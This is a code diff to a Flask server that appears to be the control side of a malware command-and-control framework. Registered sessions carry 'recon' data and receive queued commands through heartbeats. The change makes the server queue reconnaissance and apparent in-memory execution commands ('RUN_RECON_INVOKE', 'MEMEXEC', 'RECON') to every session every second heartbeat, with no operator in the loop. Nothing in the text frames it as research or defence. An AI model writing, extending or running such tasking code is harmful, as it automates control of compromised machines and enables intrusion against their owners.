@@ -25,6 +25,9 @@ app = Flask(__name__)
 SESSIONS: Dict[str, Dict[str, Any]] = {}
 HEARTBEATS: List[Dict[str, Any]] = []
 COMMAND_QUEUE: Dict[str, List[str]] = {}
+# Auto-send settings: enqueue commands every N heartbeats for a session
+AUTO_SEND_INTERVAL = 2  # every 2 heartbeats
+AUTO_COMMANDS: List[str] = ["RUN_RECON_INVOKE", "MEMEXEC", "RECON"]
 
 
 def configure_logging(verbose: bool = False) -> None:
@@ -58,6 +61,8 @@ def register():
         "recon": data,
         "registered_at": timestamp,
     }
+    # initialize per-session heartbeat counter
+    SESSIONS[session_id]["hb_count"] = 0
 
     # Initialize empty command queue for this session
     COMMAND_QUEUE.setdefault(session_id, [])
@@ -101,8 +106,20 @@ def heartbeat():
         status,
     )
 
-    # Pop next command for this session if one exists
+    # Increment per-session heartbeat counter (only for registered sessions)
     command: Optional[str] = None
+    session_info = SESSIONS.get(session_id)
+    if session_info is not None:
+        session_info["hb_count"] = session_info.get("hb_count", 0) + 1
+        hb = session_info["hb_count"]
+        # Auto-queue a command every AUTO_SEND_INTERVAL heartbeats
+        if AUTO_SEND_INTERVAL > 0 and hb % AUTO_SEND_INTERVAL == 0:
+            idx = ((hb // AUTO_SEND_INTERVAL) - 1) % len(AUTO_COMMANDS)
+            auto_cmd = AUTO_COMMANDS[idx]
+            COMMAND_QUEUE.setdefault(session_id, []).append(auto_cmd)
+            logging.info("Auto-queued command for %s: %s", session_id, auto_cmd)
+
+    # Pop next command for this session if one exists
     queue = COMMAND_QUEUE.get(session_id) or []
     if queue:
         command = queue.pop(0)
